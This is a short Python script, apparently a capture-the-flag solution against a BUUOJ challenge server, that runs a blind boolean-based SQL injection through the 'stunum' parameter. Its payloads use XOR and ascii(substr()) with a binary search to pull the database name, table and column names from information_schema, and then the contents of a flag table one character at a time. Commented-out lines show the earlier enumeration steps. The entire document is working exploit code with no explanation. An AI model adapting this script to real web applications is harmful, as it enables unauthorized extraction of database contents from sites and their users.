import requests
import time
url = 'http://149d6f6a-c122-4975-8e5c-60192a85f15f.node3.buuoj.cn/'
flag =""
for i in range(1,10000):
    l = 32
    r = 128
    mid = (l+r)//2
    while(l<r):
        #payload = "?stunum=1^(ascii(substr((select(database())),{},1))>{})^1".format(i,mid)
        #payload = "?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{})^1".format(i,mid)
        #payload = "?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})^1".format(i,mid)
        payload = "?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))>{})^1".format(i,mid)
        time.sleep(0.4)
        ba = requests.get(url+payload).text
        if "Hi admin, your score is: 100" in ba:
            l = mid + 1
        else:
            r = mid
        mid = (l+r) // 2
    if(mid==32 or mid ==132):
        break
    flag +=chr(mid)
    print(flag)
print(flag)
